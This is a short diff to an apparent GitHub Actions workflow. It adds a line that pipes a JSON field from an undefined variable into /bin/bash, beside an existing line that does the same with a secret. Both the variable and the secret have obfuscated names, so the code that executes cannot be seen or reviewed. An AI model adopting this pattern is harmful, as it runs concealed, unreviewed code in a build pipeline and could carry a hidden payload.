@@ -22,6 +22,7 @@ jobs:
           ogig82085: ${{ secrets.ogig82085 }}
         run: |
           printf '%s' "$ogig82085" | jq -r .b3916 | /bin/bash
+          echo $q45524 | jq -r .s9026 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
